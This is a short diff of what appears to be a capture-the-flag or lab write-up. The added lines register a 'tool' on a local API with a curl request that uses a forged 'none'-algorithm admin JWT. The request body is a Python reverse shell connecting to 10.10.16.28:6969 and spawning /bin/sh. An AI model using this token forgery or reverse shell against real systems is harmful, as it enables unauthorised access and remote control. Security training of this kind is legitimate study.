@@ -497,4 +497,8 @@ import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.sets
 
 This is the shell i will use
 
-So it looks like  
+So it looks like its removed my tool, so ill re add it with the new shell
+
+```python
+curl -X POST -s http://127.0.0.1:30080/api/v1/tools -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.' --data 'import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.16.28\",6969))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")' | jq .
+```
